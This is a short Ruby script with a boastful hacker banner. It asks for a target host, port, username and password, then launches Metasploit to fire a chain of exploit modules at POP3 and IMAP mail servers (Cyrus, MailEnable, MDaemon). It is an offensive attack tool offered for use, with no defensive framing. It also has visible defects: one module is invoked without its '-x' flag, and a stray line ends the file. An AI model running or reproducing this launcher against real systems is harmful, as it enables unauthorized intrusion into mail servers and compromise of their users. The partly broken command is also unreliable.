require 'colorize'
#    -x 'setg VERBOSE true'
#  -x 'setg RPORT #{$port}'
#  -x 'setg IMAPUSER #{user}' -x 'setg IMAPPASS #{user}'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """ 
     Its A Cluster Fuck Boys!! Lets Gets it!!!
""".red
puts """
		      COMBO Fucking WOMBO
""".white

puts " [?] What is the target? ".blue
print "[!] ---> ".yellow

$target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow

$port = gets.chomp


puts " [?] The username to authenticate as? ".blue
print " [!] ---> ".yellow

$user = gets.chomp

puts " [?] The password for the specified username? ".blue
print " [!] ---> ".yellow

$pass = gets.chomp





begin
ensure
exec("msfconsole -x 'use exploit/linux/pop3/cyrus_pop3d_popsubfolders' -x 'setg RHOST #{$target}' -x 'setg RPORT #{$port}' -x 'setg VERBOSE true' -x 'run' -x 'back' -x 'use exploit/windows/imap/mailenable_login' -x 'setg RHOST #{$target}' -x 'setg RPORT #{$port}' -x 'run' -x 'back' -x 'use exploit/windows/imap/mailenable_status' -x 'setg RHOST #{$target}' -x 'setg RPORT #{$port}' -x 'setg IMAPUSER #{$user}' -x 'setg IMAPPASS #{$pass}' -x 'run' -x 'back' -x 'use exploit/windows/imap/mailenable_w3c_select' -x 'setg RHOST #{$target}' -x 'setg RPORT #{$port}' -x 'setg IMAPUSER #{$user}' -x 'setg IMAPPASS #{$pass}' -x 'run' -x 'back' 'use exploit/windows/imap/mdaemon_fetch' -x 'setg RHOST #{$target}' -x 'setg RPORT #{$port}' -x 'setg IMAPUSER #{$user}' -x 'setg IMAPPASS #{$pass}' -x 'run'")
end

SS 

